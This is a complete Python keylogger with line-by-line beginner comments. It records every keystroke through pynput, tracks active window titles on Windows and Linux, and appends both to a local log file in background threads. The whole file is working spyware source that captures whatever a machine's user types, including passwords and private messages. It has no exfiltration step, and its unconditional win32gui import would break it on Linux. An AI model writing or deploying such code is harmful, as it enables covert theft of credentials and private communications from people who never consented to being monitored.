from pynput import keyboard #for capturing keyboard input
import time # built in library which helps in time related tasks
import threading # built in library which allow us to run the keylogger and window tracking at the same time without affecting each other
import platform # t helps us to check which operating system we're using
import win32gui
#conditional statement to check if it's windows os or linux os
if platform.system()=="Windows":
    import win32gui
elif platform.system()=="Linux":
    import subprocess

def get_active_window():
    try:
        if platform.system()=="Windows":
            window=win32gui.GetForegroundWindow() # gets id or the handle of the currently active window and capture that inside the window variable
            title=win32gui.GetWindowText(window) # above window variable value is feeded to the text function so that we get the title of the active window
            return title # sends the window title back to us as the result of the above function
        elif platform.system()=="Linux":
            # xdotool fetches the active window name on linux; 
            window=subprocess.check_output(['xdotool','getwindowfocus','getwindowname'])
            return window.decode('utf-8').strip() # we use windows.decode('utf-8') because the result frm xdotool is going to be in bytes so it decodes it into string and use the strip method to cleanup any whitespace
        else:
            return "Unsupported OS" # this part ensures that if the script is run on an OS other than windows and linux, it will not crash it will return Unsupported OS which is useful for debugging or informing the user
    except:
        return "Unknown Window"
#Change in the log file information
#function to track the window changes
current_window=""   #global variable
def track_window_changes():
    global current_window
    while True:
        new_window=get_active_window() # fetches the title of th currently focused window
        if new_window!=current_window:
            current_window=new_window
            with open("log.txt", "a", encoding="utf-8") as f:  # opens a file called log.txt in append mode
                f.write(f"\n\n[{current_window}]-{time.ctime()}\n")
        time.sleep(1) # wait for 1 sec after each iteration of the loop

#reacording what's actually being typed
def on_press(key):
    try:
        log=f"{key.char}"  # simply tries to get the key  
    except AttributeError:
        log=f"[{key.name}]"
    with open("log.txt", "a", encoding="utf-8") as f:  # opens the log file and appends the file
        f.write(log)

# Window Tracker - Watches for changes in the active window and KeyStroke Logger - listens for and logs every keypress, python thredding and python input libraries are required for them to operated smoothly
window_thread=threading.Thread(target=track_window_changes) # new thread to run our track_window_changes function
window_thread.daemon=True #This background thread will automatically stop when the main program ends and this is going to be good for cleanup purposes
window_thread.start()

# listens for keystrokes in the background (on_press=on_press) part means that when the key is pressed call the on_press funtion that we have defined in our code and then we capture everything inside listener variable
listener=keyboard.Listener(on_press=on_press)
listener.start()

#make sure programs stays alive to keep logging while the listener is running
listener.join()

 
